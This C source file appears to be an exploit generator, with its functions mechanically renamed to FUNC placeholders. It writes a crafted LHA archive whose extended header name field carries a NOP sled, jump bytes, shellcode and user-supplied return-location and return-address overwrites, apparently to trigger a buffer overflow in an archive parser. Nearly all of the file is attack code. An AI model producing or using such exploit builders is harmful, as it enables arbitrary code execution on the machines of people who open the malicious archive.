#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 scalar_t__ DEBUG ; 
 int E_HEADER_NAME ; 
 int E_HEADER_SIZE ; 
 int E_HEADER_TYPE ; 
 int I_ATTRIBUTE ; 
 int I_CRC ; 
 int I_EXTEND_TYPE ; 
 int I_HEADER_CHECKSUM ; 
 int I_HEADER_LEVEL ; 
 int I_HEADER_SIZE ; 
 int I_LAST_MODIFIED_STAMP ; 
 int I_METHOD ; 
 int I_NAME ; 
 int I_NAME_LENGTH ; 
 int I_ORIGINAL_SIZE ; 
 int I_PACKED_SIZE ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int FUNC2 (char*,int,int,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 int /*<<< orphan*/ * FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,int) ; 
 int /*<<< orphan*/  FUNC10 (char*,unsigned int) ; 
 int /*<<< orphan*/  FUNC11 (char*,int) ; 
 char* shellcode1 ; 
 int /*<<< orphan*/  FUNC12 (char*,char*,unsigned int*) ; 
 int FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC15 (char*) ; 

int FUNC16 (int argc, char *argv[]) {

       FILE *fp;
       char *hdr = (char *) FUNC3 (4096), *ptr;
       int header_size;
       int written_bytes;
       int total_size;
       unsigned int retloc, retaddr;
       char *filename = (char *) FUNC3 (256);
       int i;

       if (!hdr) {
               FUNC7 ("Error allocating memory");
               FUNC0 (-1);
       }

       if ( argc != 4) {
               FUNC15 ( argv[0] );
       }

       // parse arguments
       FUNC12 (argv[1], "0x%x", &retloc);
       FUNC12 (argv[2], "0x%x", &retaddr);
       FUNC14 (filename, argv[3], 255);

       FUNC5 (hdr, 0, 4096);

       // base header
       header_size = 29;
       FUNC9 (hdr + I_HEADER_SIZE, header_size);
       FUNC9 (hdr + I_HEADER_CHECKSUM, 83);
       FUNC4 (hdr + I_METHOD, "-lh0-", 5); // No compression...
       FUNC10 (hdr + I_PACKED_SIZE, 0x1234);
       FUNC10 (hdr + I_ORIGINAL_SIZE, 0x1234);
       FUNC10 (hdr + I_LAST_MODIFIED_STAMP, 0x1234);
       FUNC9 (hdr + I_ATTRIBUTE, 0x20);
       FUNC9 (hdr + I_HEADER_LEVEL, 0x01);
       FUNC9 (hdr + I_NAME_LENGTH, 0x04);
       FUNC10 (hdr + I_NAME, 0x90909090);
       FUNC11 (hdr + I_CRC, 0x6666);
       FUNC9 (hdr + I_EXTEND_TYPE, 0x55); // Unix filesystem.

       // extended header
       FUNC11 (hdr + header_size + E_HEADER_SIZE, 285);
       FUNC9 (hdr + header_size + E_HEADER_TYPE, 0x2);

       // Build our payload
       FUNC5 (hdr + header_size + E_HEADER_NAME, 0x41, 266);
       for (i = 0, ptr = hdr + header_size + E_HEADER_NAME; i < (240
       - FUNC13 (shellcode1) - 10);) {
               ptr[i++] = 0xeb;
               ptr[i++] = 0x0a;
       }
       for (; i < (240 - FUNC13 (shellcode1));) {
               ptr[i++]=0x90;
       }
       FUNC4 (hdr + header_size + E_HEADER_NAME + 240 - FUNC13
       (shellcode1), shellcode1, FUNC13(shellcode1));

       FUNC10 (hdr + header_size + E_HEADER_NAME + 266,
       0x41414141);
       FUNC10 (hdr + header_size + E_HEADER_NAME + 270,
       0xB7E34CC2);
       FUNC10 (hdr + header_size + E_HEADER_NAME + 274, retloc
       - 0xc);
       FUNC10 (hdr + header_size + E_HEADER_NAME + 278,
       retaddr);

       // Size of next extended header is 0
       FUNC11 (hdr + header_size + E_HEADER_NAME + 282, 0x0000);

       total_size = (header_size + 284 + E_HEADER_NAME);

       fp = FUNC6 (filename);

       if ( (written_bytes = FUNC2 ( hdr, 1, total_size, fp)) != 0 )
       {
               if (DEBUG) FUNC8 ("%d bytes written\n",
               written_bytes);
       } else {
               FUNC7 ("Cant write to the file\n");
       }

       FUNC1 (fp);

       return 0;
}